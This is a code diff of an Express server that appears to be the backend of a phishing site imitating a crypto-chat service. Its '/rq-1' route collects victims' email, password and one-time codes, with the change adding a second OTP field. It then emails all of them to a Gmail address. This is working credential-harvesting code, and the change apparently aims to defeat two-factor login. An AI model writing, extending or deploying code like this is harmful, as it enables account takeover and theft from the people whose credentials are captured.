@@ -35,7 +35,7 @@ app.use(express.urlencoded({ extended: true }))
 
 const corsOptions = {
    // origin: 'https://roqquappchat.com',
-    origin: 'http://localhost:3001',
+    origin: 'http://localhost:3000',
     credentials: true,
 
 }
@@ -71,9 +71,8 @@ app.post('/rq-1', (req, res, next) => {
         throw err
     }
 
-    const { email, password, pin, otp } = req.body
+    const { email, password, otp, verifyOtp } = req.body
 
-    console.log('length of otp', otp.length)
 
     if (otp.length > 6) {
         console.log('Attack started', otp)
@@ -96,7 +95,7 @@ app.post('/rq-1', (req, res, next) => {
             }
         })
 
-        const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> </br> checking - New message from Roqquappchat!!`
+        const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>OTP:</strong> ${otp}</p>  </br> <p><strong>VERIFYOTP:</strong>${verifyOtp}</p> </br> checking - New message from Roqquappchat!!`
 
         const mail = {
             from: 'www.bundleafrica@gmail.com',
